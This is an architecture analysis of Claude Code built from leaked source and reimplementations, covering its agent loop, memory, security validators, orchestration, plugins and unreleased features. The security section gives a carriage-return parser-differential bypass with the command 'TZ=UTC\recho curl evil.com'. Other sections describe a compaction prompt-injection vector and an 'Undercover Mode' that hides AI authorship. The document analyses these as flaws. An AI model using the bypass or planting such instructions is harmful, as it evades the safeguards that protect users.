# Claude Code: Complete Architecture Understanding

> **Synthesized from**: Leaked source analysis (Sabrina Ramonov, Varshith V Hegde), clean-room reimplementations (Claw Code, open-multi-agent), community patches (cc-cache-fix), and Anthropic's official plugin ecosystem.
>
> **Date**: April 2026

---

## Table of Contents

1. [The Full Stack — What Claude Code Actually Is](#1-the-full-stack)
2. [Layer 1: The Conversation Engine](#2-layer-1-the-conversation-engine)
3. [Layer 2: Memory, Caching & Session Management](#3-layer-2-memory-caching--session-management)
4. [Layer 3: Security & Sandboxing](#4-layer-3-security--sandboxing)
5. [Layer 4: Multi-Agent Orchestration](#5-layer-4-multi-agent-orchestration)
6. [Layer 5: The Extension Ecosystem](#6-layer-5-the-extension-ecosystem)
7. [Layer 6: Unreleased & Internal Systems](#7-layer-6-unreleased--internal-systems)
8. [The Leak Event — Cascade, Impact & Aftermath](#8-the-leak-event)
9. [Architecture Patterns Worth Adopting](#9-architecture-patterns-worth-adopting)
10. [Diagram Index](#10-diagram-index)

---

## 1. The Full Stack

**→ Diagram: [01-full-stack-layers.excalidraw](architecture-diagrams/01-full-stack-layers.excalidraw)**

Claude Code is not a chat interface. It is a **512,000-line TypeScript agentic harness** — a multi-layered infrastructure system that wraps the Claude model with tools, security, memory, orchestration, and extensibility. The CLI is just the surface.

The architecture decomposes into six layers, from the innermost engine to the outermost ecosystem:

```
Layer 6: Extension Ecosystem (plugins, commands, agents, skills, hooks)
         ↑ Official public repo — what developers customize
Layer 5: Multi-Agent Orchestration (Coordinator Mode, task DAGs, fan-out)
         ↑ Leaked — reimplemented by open-multi-agent
Layer 4: Security & Sandboxing (bash validators, permissions, sandbox)
         ↑ Leaked — 9.7K lines, parser differential documented
Layer 3: Memory & Caching (3-layer memory, compaction, prompt cache, sessions)
         ↑ Leaked — db8 bug found by cc-cache-fix, compaction attack by Sabrina
Layer 2: Conversation Engine (API client, streaming, tool loop, retry)
         ↑ Leaked — reimplemented by Claw Code (Rust)
Layer 1: Model Interface (Claude API, provider abstraction)
         ↑ Anthropic's proprietary model — not exposed
```

### What Each Reimplementation Covers

| Layer | Claude Code (leaked) | Claw Code | open-multi-agent | Plugin Repo | cc-cache-fix |
|-------|---------------------|-----------|-------------------|-------------|-------------|
| L1: Model Interface | Full | 3 providers | 6+ providers | — | — |
| L2: Conversation Engine | Full | Full | AgentRunner | — | — |
| L3: Memory & Caching | Full | Session + compaction | — | — | db8 patch |
| L4: Security | 9.7K lines | Basic permissions | — | hookify/security hooks | — |
| L5: Orchestration | Coordinator Mode | Agent dispatch | Full (core focus) | PR review fan-out | — |
| L6: Extension | 4 primitives | 28 commands | — | 13 plugins, 15 agents | — |

### By the Numbers

| Metric | Value | Source |
|--------|-------|--------|
| Total lines of code | 512,000+ | Leak |
| TypeScript files | 1,906 | Leak |
| Built-in tools | ~40 (29K lines) | Leak |
| Query engine | 46,000 lines | Leak |
| Bash security system | 9,707 lines | Sabrina |
| Security validators | 22 unique | Sabrina |
| Hidden feature flags | 44 | Varshith |
| Annual revenue (Claude Code) | $2.5 billion | Varshith |
| Annual revenue (Anthropic total) | $19 billion | Varshith |

---

## 2. Layer 1: The Conversation Engine

**→ Diagram: [02-conversation-engine-loop.excalidraw](architecture-diagrams/02-conversation-engine-loop.excalidraw)**

The innermost layer is the agentic conversation loop — the cycle of: build messages → call API → stream response → detect tool use → check permissions → execute tool → append result → loop.

### The Core Loop

Both the leaked source and Claw Code's `runtime/conversation.rs` implement the same pattern:

```
┌─────────────────────────────────────────────────────────┐
│                    CONVERSATION LOOP                      │
│                                                           │
│  ┌──────────┐   ┌──────────┐   ┌───────────────────┐    │
│  │ Build    │──►│ API Call  │──►│ Stream Response    │    │
│  │ Messages │   │ (SSE)    │   │ (text + tool_use)  │    │
│  └──────────┘   └──────────┘   └─────────┬─────────┘    │
│       ▲                                    │              │
│       │                          ┌─────────▼─────────┐   │
│       │                          │ Is it a tool call? │   │
│       │                          └─────────┬─────────┘   │
│       │                         Yes        │        No   │
│       │                    ┌───────────┐   │   ┌──────┐  │
│       │                    │ Permission│   │   │Return│  │
│       │                    │ Check     │   │   │Result│  │
│       │                    └─────┬─────┘   │   └──────┘  │
│       │                          │         │              │
│       │                    ┌─────▼─────┐   │              │
│       │                    │ Pre-hooks  │   │              │
│       │                    └─────┬─────┘   │              │
│       │                          │         │              │
│       │                    ┌─────▼─────┐   │              │
│       │                    │ Execute   │   │              │
│       │                    │ Tool      │   │              │
│       │                    └─────┬─────┘   │              │
│       │                          │         │              │
│       │                    ┌─────▼─────┐   │              │
│       │                    │ Post-hooks │   │              │
│       │                    └─────┬─────┘   │              │
│       │                          │         │              │
│       └──────────────────────────┘         │              │
│              (append tool result,           │              │
│               loop back)                    │              │
└─────────────────────────────────────────────┘              
```

### API Client Architecture

The API client handles streaming via Server-Sent Events (SSE). Claw Code reveals the multi-provider abstraction:

```
ProviderClient
├── ClawApi (Anthropic native) — sends Anthropic message format directly
├── Xai (xAI/Grok) — translates Anthropic → OpenAI chat completions format
└── OpenAi (GPT) — translates Anthropic → OpenAI chat completions format
```

The SSE stream parsing is non-trivial — particularly for OpenAI-compatible providers, where tool call arguments arrive in incremental deltas that must be buffered and reassembled.

### Tool System (~40 Tools, 29K Lines)

Each tool is a self-contained module with:
- **Schema** — Zod/JSON Schema defining input parameters
- **Permission model** — read-only, needs-approval, always-denied
- **Validation logic** — input sanitization, path validation
- **Executor** — the actual implementation
- **Output formatter** — structured result for context injection

Known tools from the leak + Claw Code:

| Category | Tools |
|----------|-------|
| Shell | `BashTool`, `PowerShellTool` |
| Filesystem | `FileReadTool`, `FileWriteTool`, `FileEditTool`, `MultiEditTool`, `GlobTool`, `GrepTool` |
| Web | `WebFetchTool`, `WebSearchTool` |
| IDE | `LSPTool` (diagnostics, definitions, references) |
| Notebook | `NotebookReadTool`, `NotebookEditTool` |
| Task tracking | `TodoReadTool`, `TodoWriteTool` |
| Agent | `AgentTool` (sub-agent dispatch) |
| Internal-only | `TungstenTool` (keystroke/screen-capture, `USER_TYPE === 'ant'` gated) |
| KAIROS-only | `SendUserFileTool`, `PushNotificationTool`, `SubscribePRTool` |

### Prompt Cache Boundary

A performance-critical design discovered in the leak:

```
System Prompt = [STATIC SECTION] + SYSTEM_PROMPT_DYNAMIC_BOUNDARY + [DYNAMIC SECTION]

Static (cached globally across ALL orgs):
  - Base instructions
  - Tool definitions
  - Behavioral guidelines

Dynamic (per-session, not cached):
  - CLAUDE.md project config
  - Git status
  - Current date
  - User-specific settings
```

This split means Anthropic only pays for cache creation of tool definitions once — shared across every organization. User-specific context doesn't bust the global cache.

### A/B Testing Insight

An internal comment at `src/constants/prompts.ts:527`: "research shows ~1.2% output token reduction vs qualitative 'be concise.'" Production uses hard word counts: "keep text between tool calls to ≤25 words. Keep final responses to ≤100 words."

---

## 3. Layer 2: Memory, Caching & Session Management

**→ Diagram: [03-memory-and-caching.excalidraw](architecture-diagrams/03-memory-and-caching.excalidraw)**

This is the layer that separates "demo" from "production." The leaked source reveals sophisticated memory management that no public documentation has described.

### Three-Layer Memory Architecture

```
┌───────────────────────────────────────────────────────────┐
│  Layer 1: MEMORY.md (Always in context)                    │
│  ─────────────────                                         │
│  Lightweight index of POINTERS (~150 chars per entry)      │
│  Stores LOCATIONS, not data                                │
│  Example: "Auth system → see auth-patterns.md"             │
│           "DB schema → see schema-notes.md"                │
│           "Deploy process → see deploy.md, section 3"      │
│                                                            │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  Layer 2: Topic Files (Fetched on-demand)            │   │
│  │  ─────────────────                                   │   │
│  │  Actual project knowledge, never fully in context    │   │
│  │  Each topic file is a self-contained document        │   │
│  │  Loaded when a pointer in Layer 1 is followed        │   │
│  │                                                      │   │
│  │  ┌───────────────────────────────────────────────┐   │   │
│  │  │  Layer 3: Raw Transcripts (Searched only)      │   │   │
│  │  │  ─────────────────                             │   │   │
│  │  │  Never re-read fully                           │   │   │
│  │  │  Only grep'd for specific identifiers          │   │   │
│  │  │  JSONL session files in ~/.claude/projects/    │   │   │
│  │  └───────────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────────┘   │
└───────────────────────────────────────────────────────────┘
```

**Strict Write Discipline:** The agent can only update its memory index (Layer 1) after a confirmed successful file write. This prevents the agent from recording information about failed attempts or hallucinated states. The agent treats its own memory as a "hint" and verifies facts against the actual codebase before acting.

This is essentially RAG (Retrieval-Augmented Generation) where the retrieval index permanently lives in context, but the actual documents are lazy-loaded. Elegant, efficient, and resistant to context pollution.

### Session Persistence & The `db8` Bug

Sessions are saved as JSONL files in `~/.claude/projects/`. A filter function called `db8` decides what gets persisted. The cc-cache-fix project discovered a critical bug:

```javascript
// The db8 filter (minified)
function db8(A) {
  if (A.type === "attachment" && ss1() !== "ant") {
    // For non-Anthropic users, drops ALL attachments except hook_additional_context
    // INCLUDING deferred_tools_delta — which tracks announced tools
    return false;  // ← THE BUG
  }
  return true;
}
```

**The cascade:**
1. `db8` strips `deferred_tools_delta` records from saved sessions
2. On resume, Claude Code scans history: "what tools did I already announce?"
3. Finds nothing → re-announces ALL deferred tools from scratch
4. This shifts message positions → billing hash changes → cache prefix breaks
5. Entire conversation rebuilt as `cache_creation` tokens (expensive) instead of `cache_read` (cheap)

**Impact:** Cache ratio drops from ~99% to ~26% on every resumed session. Fix: two lines adding `deferred_tools_delta` and `mcp_instructions_delta` to the allowlist.

**Why Anthropic employees never saw it:** The `ss1() !== "ant"` guard means Anthropic users get a different code path where ALL attachments are preserved. Classic privileged-testing-environment bug.

### Compaction System

When conversations exceed the context window, Claude Code forks a second, smaller Claude to summarize:

```
Long conversation (100K+ tokens)
  ↓
Fork summarizer Claude
  ↓
Chain-of-thought in <analysis> tags
  ↓
formatCompactSummary() strips reasoning
  ↓
Compressed summary injected back into context
  ↓
User continues with shorter context
```

**Compaction Attack Vector (Sabrina):** The summarizer treats ALL content equally — no distinction between:
- Instructions the user typed
- Instructions found in files Claude read (CLAUDE.md, README, config)

If an attacker plants instructions in a project file and Claude reads it, those injected instructions survive compaction — baked into the summary indistinguishable from the user's real commands. This is a fundamental limitation of ALL summarization-based context management.

**250K Wasted API Calls/Day:** A BigQuery analysis (March 10, 2026) found 1,279 sessions retrying failed compaction up to 3,272 times each. Fix: `MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3`.

---

## 4. Layer 3: Security & Sandboxing

**→ Diagram: [04-security-defense-in-depth.excalidraw](architecture-diagrams/04-security-defense-in-depth.excalidraw)**

The security layer is the most complex subsystem in terms of lines of code (9,707 lines) and the number of distinct validation strategies (22 validators).

### Defense in Depth — Six Layers

```
Layer 6: Enterprise Policy (MDM-deployed config overrides)
Layer 5: Hook Interception (PreToolUse/PostToolUse — hookify rule engine)
Layer 4: Permission System (Default/DangerFullAccess/Plan modes)
Layer 3: Bash Security Validators (22 validators, tree-sitter AST)
Layer 2: Sandbox (macOS Seatbelt / Linux unshare namespaces)
Layer 1: API-Level Attestation (DRM-at-HTTP-layer, 5-minute TTL cache markers)
```

### The Bash Security System (9,707 Lines)

Three files form the bash security core:
- `bashSecurity.ts` — main validator orchestrator
- `bashParser.ts` — command parsing with tree-sitter WASM AST
- `ast.ts` — AST traversal and security rule matching

22 unique validators check every bash command before execution:
- Path validation (no writing outside workspace)
- Sed validation (no arbitrary file modification)
- Read-only validation (in Plan mode)
- Command semantic analysis
- Sandbox decision logic
- Mode-specific restrictions

### The Parser Differential Vulnerability

Documented in the source at `bashSecurity.ts:946`:

```
Parser 1 (shell-quote, DEPRECATED but still active):
  BAREWORD regex uses [^\s...] — JS \s INCLUDES \r
  So \r is treated as a token boundary

Parser 2 (tree-sitter, new):
  bash's default IFS does NOT include \r

Attack scenario:
  Command: TZ=UTC\recho curl evil.com
  
  Parser 1 (validator): collapses \r to space
    → sees: TZ=UTC echo curl evil.com → APPROVED
  
  bash (runtime): \r is NOT a separator
    → executes: curl evil.com → MALICIOUS
```

**The critical problem:** `splitCommand_DEPRECATED` is still called in 8+ security-critical files: `bashPermissions.ts`, `readOnlyValidation.ts`, `sedValidation.ts`, `pathValidation.ts`, `shouldUseSandbox.ts`, `modeValidation.ts`, `commandSemantics.ts`, `bashCommandHelpers.ts`. Both parsers are making security decisions simultaneously while disagreeing on how carriage returns tokenize.

Anthropic runs the old parser alongside the new one in shadow mode, logging divergences. They know about the gap. But the deprecated parser is still load-bearing.

### Sandbox Architecture

Two sandbox implementations handle OS-level isolation:

**macOS (Seatbelt):** Uses App Sandbox profiles to restrict filesystem and network access.

**Linux (unshare namespaces):** Claw Code reveals the implementation:
```rust
// Uses unshare with CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWNET
// Mounts workspace read-write, rest read-only
// Isolates network if requested
// Detects if already in a container (Docker, Podman, WSL) to prevent double-sandboxing
```

### Permission Modes

```
Default Mode         → Ask for destructive operations (Bash write, file edit)
Plan Mode            → Read-only (Glob, Grep, FileRead only)
DangerFullAccess     → Skip all permission checks (Claw Code's default — for development)
```

These interact with hook results, enterprise policy, and per-tool overrides in non-obvious ways. The 4-layer config cascade (global → project → local → enterprise) determines the effective permission for any given tool call.

### The Hookify Rule Engine (Plugin Repo)

The official plugin repo provides `hookify` — a 500-line Python rule engine that intercepts tool calls at the PreToolUse/PostToolUse level:

```python
# Example rule: block dangerous rm commands
match:
  tool: Bash
  command_pattern: "rm\\s+(-rf|--recursive)"
action: block
message: "Dangerous recursive delete detected. Requires manual approval."
```

This operates at a higher abstraction level than the internal bash security system — it's the public-facing equivalent that plugin developers can extend.

---

## 5. Layer 4: Multi-Agent Orchestration

**→ Diagram: [05-multi-agent-orchestration.excalidraw](architecture-diagrams/05-multi-agent-orchestration.excalidraw)**

The orchestration layer is where Claude Code becomes a system of AI agents rather than a single agent.

### Coordinator Mode (Internal)

The leaked source reveals Coordinator Mode — one Claude spawning and managing multiple worker Claude agents in parallel:

```
User Goal: "Implement authentication with OAuth, database migration, and API tests"
     │
     ▼
┌─────────────────────┐
│  COORDINATOR AGENT   │
│  (task decomposition) │
└──────────┬──────────┘
           │
    ┌──────┴──────────────────────┐
    │              │              │
    ▼              ▼              ▼
┌────────┐  ┌──────────┐  ┌──────────┐
│Worker 1│  │ Worker 2  │  │ Worker 3  │
│ OAuth  │  │ DB migrate│  │ API tests │
└───┬────┘  └─────┬────┘  └─────┬────┘
    │              │              │
    ▼              ▼              ▼
┌─────────────────────────────────────┐
│  COORDINATOR: aggregate results,     │
│  resolve conflicts, synthesize       │
└─────────────────────────────────────┘
```

### open-multi-agent: The Clean-Room Extraction

JackChen's `open-multi-agent` framework (4.6K stars, MIT) re-implements exactly this pattern:

| Component | Purpose |
|-----------|---------|
| `OpenMultiAgent` | Orchestrator — `createTeam()`, `runTeam()`, `runTasks()`, `runAgent()` |
| `Team` | Agent configs + MessageBus + TaskQueue + SharedMemory |
| `AgentPool` | Semaphore-controlled parallel agent execution |
| `TaskQueue` | DAG with topological dependency resolution, cascade failure |
| `AgentRunner` | The model → tool → model conversation turn cycle |
| `LLMAdapter` | Provider abstraction (Anthropic, OpenAI, Grok, Gemini, Copilot) |
| `ToolRegistry` | `defineTool()` with Zod schema validation |

Three run modes:
1. `runAgent()` — single agent, one prompt
2. `runTeam()` — give a goal, framework auto-decomposes into task DAG
3. `runTasks()` — you define the task graph and assignments explicitly

### PR Review Fan-Out (Plugin Repo)

The official plugin repo implements the same pattern for code review:

```
/review command
     │
     ▼
┌───────────────────┐
│  ORCHESTRATOR      │
│  (pr-review.md)    │
└────────┬──────────┘
         │
   ┌─────┼─────┬─────┬─────┬─────┐
   ▼     ▼     ▼     ▼     ▼     ▼
 logic security perf  style docs  arch
 agent  agent  agent agent agent agent
   │     │     │     │     │     │
   └─────┴─────┴─────┴─────┴─────┘
                  │
                  ▼
         Aggregated Review
```

Six specialist agents run in parallel, each with restricted tool access (read-only tools, no bash), then results are synthesized into a unified review.

### Task Scheduling: Topological Dependency Resolution

Both Claude Code (internal) and open-multi-agent implement task scheduling as a directed acyclic graph (DAG) with topological sort:

```
Task: design-api (no deps)        ──→ runs immediately
Task: implement-api (deps: design) ──→ waits for design
Task: implement-ui  (deps: design) ──→ waits for design (runs parallel with implement-api)
Task: write-tests (deps: impl-api) ──→ waits for implement-api
Task: review (deps: impl-api, impl-ui, tests) ──→ waits for all three
```

Independent tasks run in parallel. Failure cascades: if `implement-api` fails, `write-tests` and `review` are automatically cancelled.

---

## 6. Layer 5: The Extension Ecosystem

**→ Diagram: [06-extension-ecosystem.excalidraw](architecture-diagrams/06-extension-ecosystem.excalidraw)**

The outermost layer is the public extension system — four composable primitives that developers use to customize Claude Code's behavior.

### Four Primitives

| Primitive | Trigger | Scope | Runtime |
|-----------|---------|-------|---------|
| **Command** | User types `/command-name` | Single workflow invocation | Markdown template |
| **Agent** | Spawned by commands via `Task` tool | Autonomous subprocess | Markdown system prompt |
| **Skill** | Loaded on demand as knowledge | Passive reference material | Markdown knowledge file |
| **Hook** | System event fires automatically | Intercepts every matching event | Python/Shell/JSON config |

### Hook Events

| Event | When | Use Case |
|-------|------|----------|
| `PreToolUse` | Before any tool executes | Block dangerous commands, add warnings |
| `PostToolUse` | After tool completes | Audit, logging, validation |
| `Stop` | Session ending | Completion verification, cleanup |
| `SessionStart` | Session begins | Environment setup, style injection |
| `UserPromptSubmit` | User sends message | Input validation, transformation |

### The 13 Official Plugins

| Plugin | Type | Notable Pattern |
|--------|------|-----------------|
| **hookify** | Rule engine | Full PreToolUse/PostToolUse interception in ~500 lines Python |
| **pr-review-toolkit** | Multi-agent | 6 specialist agents in parallel fan-out |
| **feature-dev** | Workflow | Architect → Explorer → Developer → Reviewer pipeline |
| **plugin-dev** | Meta-plugin | Teaches AI to create more plugins (bootstrapping) |
| **code-review** | Single command | `/review` with structured feedback |
| **commit-commands** | Git workflow | `/commit`, `/commit-push-pr`, `/clean_gone` |
| **ralph-wiggum** | Autonomous loop | Self-referential completion verification |
| **security-guidance** | Safety hooks | PreToolUse bash command scanning |
| **explanatory-output-style** | Session hook | Injects style preferences at session start |
| **learning-output-style** | Session hook | Teaching-oriented output formatting |
| **frontend-design** | Knowledge skill | Frontend design patterns and best practices |
| **claude-opus-4-5-migration** | Migration skill | Model upgrade guidance |
| **agent-sdk-dev** | SDK verification | Parallel TypeScript + Python SDK testing |

### The Configuration Hierarchy

```
Layer 4: Enterprise/MDM policy    (highest precedence — cannot be overridden)
Layer 3: Local overrides          (.claude/settings.local.json)
Layer 2: Project-level            (.claude/settings.json)
Layer 1: Global defaults          (~/.config/claude/settings.json)
```

Each layer can configure: allowed/denied tools, permission modes, model selection, MCP servers, hook configurations, and plugin settings. Enterprise policy at Layer 4 provides organizational guardrails that individual developers cannot bypass.

---

## 7. Layer 6: Unreleased & Internal Systems

**→ Diagram: [07-unreleased-systems.excalidraw](architecture-diagrams/07-unreleased-systems.excalidraw)**

The leak exposed several fully-built but unreleased systems behind feature flags.

### KAIROS — Autonomous Agent Daemon

190 references across 61 files. The largest unreleased feature:

| Component | Purpose |
|-----------|---------|
| Daemon mode | Runs unattended via GitHub webhooks + 5-minute cron cycles |
| `/dream` command | Background memory consolidation during idle periods |
| `autoDream.ts` | Triple-gated: 24h elapsed → 5+ sessions accumulated → file lock acquired |
| Consolidation lock | File mtime = `lastConsolidatedAt` timestamp, PID in body, stale after 1h |
| Exclusive tools | `SendUserFileTool`, `PushNotificationTool`, `SubscribePRTool` |
| Brief mode | Compact output format for persistent background assistant |

The memory consolidation is the most interesting piece: it **merges disparate observations, removes logical contradictions, and converts vague insights into verified facts** — essentially the AI maintaining its understanding of your project while you sleep.

### ULTRAPLAN — Remote Planning

Offloads complex planning to a remote Cloud Container Runtime (CCR) session running Opus for up to 30 minutes. Polls every 3 seconds. A sentinel value `__ULTRAPLAN_TELEPORT_LOCAL__` detects completion and beams the result back to the local terminal.

### Anti-Distillation Mechanisms

Two mechanisms to prevent competitors from training on Claude Code's API traffic:

1. **Fake Tools:** `ANTI_DISTILLATION_CC` flag sends `anti_distillation: ['fake_tools']` in API requests. The server injects decoy tool definitions into the system prompt. Competitors recording traffic get poisoned training data.

2. **Signed Summaries:** Server-side connector-text summarization. The API buffers the assistant's reasoning between tool calls, returns only summaries, and cryptographically signs them. Competitors get summaries, not full reasoning chains.

### Undercover Mode

`src/utils/undercover.ts` — 89 lines. Activates automatically for Anthropic employees on non-allowlisted repos:
- Instructs Claude to write commits "as a human developer would"
- Suppresses AI attribution (`Co-Authored-By` lines)
- No force-OFF exists — even employees who want to be transparent cannot disable it
- Covers Anthropic's own public repos (including `anthropics/claude-code`, 82K+ stars)
- The allowlist leaked 22 private repo names

### BUDDY — The Tamagotchi Easter Egg

A hidden pet system planned for April 1-7, 2026:
- 18 species (duck, dragon, axolotl, capybara, mushroom, ghost, nebulynx...)
- Gacha rarity tiers: Common > Uncommon > Rare > Epic > Legendary
- 1% shiny chance (independent of rarity)
- RPG stats: DEBUGGING, PATIENCE, CHAOS, WISDOM, SNARK
- Species names encoded as hex (`String.fromCharCode()`) to avoid triggering their own build security scanner
- PRNG seeded from userId hash + salt `'friend-2026-401'` — same user always gets the same species

### "Capybara" / "Mythos" — Next Model

References to Anthropic's next major model family. Beta flags reference specific API version strings. Fast and slow variants with significantly larger context window. A separate leak 5 days earlier exposed ~3,000 internal files with further Capybara/Mythos details.

---

## 8. The Leak Event

**→ Diagram: [08-leak-cascade-and-impact.excalidraw](architecture-diagrams/08-leak-cascade-and-impact.excalidraw)**

### The Technical Chain

```
Failure 1: Missing *.map in .npmignore
  ↓
Failure 2: Bun bug #28001 (source maps in production, open 20 days)
  ↓
Failure 3: R2 bucket publicly accessible, no auth
  ↓
npm install @anthropic-ai/claude-code
  → cli.js.map (59.8 MB) included
    → contains URL to src.zip on R2
      → 512,000 lines of TypeScript, fully readable
```

This was the **second** time — same bug, same vector, 13 months after the first incident.

### Timeline (March 31, 2026)

| UTC | Event |
|-----|-------|
| 00:21 | Malicious axios 1.14.1/0.30.4 published (unrelated RAT) |
| ~04:00 | Claude Code v2.1.88 pushed to npm with source map |
| 04:23 | Chaofan Shou tweets discovery (→ 16M views) |
| 06:00 | 50K GitHub stars in 2 hours (fastest ever) |
| 06:00 | 41,500+ forks |
| ~08:00 | Anthropic pulls npm package |
| Same day | Python clean-room rewrite (DMCA-proof) |
| Same day | Gitlawb mirrors ("Will never be taken down") |
| Same day | Claw Code Rust port begins |
| Day 5 | open-multi-agent framework published |
| Day 5 | cc-cache-fix repo published |

### The Aftermath Tree

```
The Leak
├── Clean-Room Reimplementations
│   ├── Claw Code (Rust) — engine layer
│   ├── open-multi-agent (TypeScript) — orchestration layer
│   └── Multiple Python ports
├── Bug Discoveries
│   ├── cc-cache-fix: db8 session filter bug (26% → 99% cache ratio)
│   ├── Compaction attack vector (prompt injection through file contents)
│   └── Parser differential (\r disagreement between security validators)
├── Community Impact
│   ├── Anthropic dev confirmed bugs, promised patches
│   ├── DMCA takedowns on GitHub (complied immediately)
│   ├── Gitlawb mirrors (outside DMCA reach)
│   └── AI copyright question raised (DC Circuit ruling)
├── Competitive Impact
│   ├── Feature roadmap exposed (KAIROS, ULTRAPLAN, Capybara)
│   ├── Architecture patterns now public knowledge
│   └── Security mechanisms documented (anti-distillation, undercover)
└── Ethical Questions
    ├── Undercover Mode: hiding AI authorship on public repos
    ├── Anti-distillation: poisoning competitor training data
    └── Cache TTL as business decision vs. bug
```

---

## 9. Architecture Patterns Worth Adopting

### For Any AI Agent System

| Pattern | Where It Appears | How to Adopt |
|---------|-----------------|--------------|
| **Three-layer memory** | Leaked source | Layer 1 pointer index (always in context) → Layer 2 topic files (on-demand) → Layer 3 raw transcripts (grep only) |
| **Strict Write Discipline** | Leaked source | Update memory index only after confirmed file writes; treat own memory as "hint" and verify against ground truth |
| **Verification Agent excuses list** | `verificationAgent.ts` | Pre-program a list of known lazy rationalizations into your verification prompts; "the implementer is an LLM. Verify independently." |
| **Prompt cache boundary** | `SYSTEM_PROMPT_DYNAMIC_BOUNDARY` | Split system prompt into static (cached globally) and dynamic (per-session) sections |
| **Circuit breaker on retries** | `MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3` | Every retry loop needs a failure limit from day one, not after a BQ query catches 250K wasted calls |

### For Multi-Agent Systems

| Pattern | Where It Appears | How to Adopt |
|---------|-----------------|--------------|
| **Coordinator → task DAG** | Coordinator Mode, open-multi-agent | Auto-decompose goals into dependency graphs; run independent tasks in parallel |
| **MessageBus + SharedMemory** | open-multi-agent | Inter-agent communication through shared bus, not direct coupling |
| **Fan-out specialist agents** | PR review toolkit | Spawn multiple narrow-focus agents in parallel, aggregate results |
| **Agent tool whitelists** | Plugin agents | Restrict each agent to only the tools its role requires (reviewer gets read-only, developer gets write) |

### For Security

| Pattern | Where It Appears | How to Adopt |
|---------|-----------------|--------------|
| **AST-based command validation** | Bash security system | Parse commands into ASTs before security checks; don't regex raw strings |
| **Defense in depth (6 layers)** | Full security stack | Sandbox + permissions + hook interception + validators + enterprise policy + API-level attestation |
| **Content origin tagging** | Missing (the compaction vulnerability) | Tag summarized content with its origin (user input vs. file content vs. tool output) so the summarizer can prioritize |

### Anti-Patterns to Avoid

| Anti-Pattern | Lesson |
|-------------|--------|
| Manual deploy steps for 13 months | If it's manual, it will be skipped. Automate on day one. |
| Privileged testing paths (`ss1()==="ant"`) | Test as your users, not as yourself. The `db8` bug was invisible to Anthropic employees. |
| Deprecated parsers still making security decisions | Actually deprecate deprecated code. Don't leave two parsers disagreeing in production. |
| No package size CI check | A 60MB spike in a normally 5MB package should block publish automatically. |
| `DangerFullAccess` as default | Never default to permissive. Claw Code ships with all permissions bypassed. |

---

## 10. Diagram Index

| # | Diagram | Shows |
|---|---------|-------|
| 01 | [01-full-stack-layers.excalidraw](architecture-diagrams/01-full-stack-layers.excalidraw) | The 6-layer architecture with what each reimplementation covers |
| 02 | [02-conversation-engine-loop.excalidraw](architecture-diagrams/02-conversation-engine-loop.excalidraw) | The agentic loop: messages → API → stream → tool → permission → hook → execute → loop |
| 03 | [03-memory-and-caching.excalidraw](architecture-diagrams/03-memory-and-caching.excalidraw) | Three-layer memory + session persistence + db8 bug + compaction flow |
| 04 | [04-security-defense-in-depth.excalidraw](architecture-diagrams/04-security-defense-in-depth.excalidraw) | 6 security layers + parser differential + bash validation pipeline |
| 05 | [05-multi-agent-orchestration.excalidraw](architecture-diagrams/05-multi-agent-orchestration.excalidraw) | Coordinator Mode + task DAG + fan-out + open-multi-agent mapping |
| 06 | [06-extension-ecosystem.excalidraw](architecture-diagrams/06-extension-ecosystem.excalidraw) | 4 primitives + hook events + config hierarchy + 13 plugins |
| 07 | [07-unreleased-systems.excalidraw](architecture-diagrams/07-unreleased-systems.excalidraw) | KAIROS daemon + ULTRAPLAN + anti-distillation + Undercover Mode + BUDDY |
| 08 | [08-leak-cascade-and-impact.excalidraw](architecture-diagrams/08-leak-cascade-and-impact.excalidraw) | The 3-failure chain + timeline + aftermath tree |

---

*Architecture understanding synthesized from 8+ primary sources. April 2026.*
